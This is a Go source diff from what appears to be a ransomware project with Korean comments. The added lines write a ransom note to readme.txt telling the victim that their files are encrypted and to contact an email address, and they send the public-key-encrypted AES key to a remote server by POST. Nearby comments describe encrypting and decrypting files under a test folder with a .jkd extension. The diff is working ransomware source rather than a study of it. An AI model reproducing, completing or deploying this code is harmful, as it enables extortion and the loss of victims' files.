@@ -8,8 +8,18 @@ import (
 	"rswAES256/client"
 	"rswAES256/config"
 	"rswAES256/encrypt"
+	"rswAES256/readme"
 	"time"
 )
+
+var readmeText = `Your documents, photos and other important files have been envrypted.
+
+the only way to decrypt your files is to receive the private key and decryption program.
+
+to receive the private key and decryption program, you have to hire me.
+
+for more information, Please contact jeet95@naver.com
+`
 
 var path = "./config.toml"
 var filePath = "." + string(filepath.Separator) + filepath.Join("test") // OS 독립적 파일 경로(.\test)
@@ -50,9 +60,23 @@ func main() {
 	}
 	fmt.Println("cipherText:", cipherText)
 
-	time.Sleep(time.Second * 3)
+	// readme.txt 생성.
+	file, err := readme.CreateFileReadme("./readme.txt")
+	if err != nil {
+		log.Fatalln(err)
+	}
+	// readme.txt 작성.
+	err = readme.WriteFileReadme(file, readmeText)
+	if err != nil {
+		log.Fatalln(err)
+	}
+
+	time.Sleep(time.Second * 2)
 	// 공개키로 암호화된 키를 서버로 전송
-	client.SendCipherWithPOST(cipherText)
+	err = client.SendCipherWithPOST(cipherText)
+	if err != nil {
+		//todo 공개키로 암호화된 키를 로컬에 저장.
+	}
 
 	// rootPath의 하위 파일들을 복호화(확장자가.jkd으로 암호화된것만 복호화)
 	//err = newClient.AESDecryptDirectory("./test/")
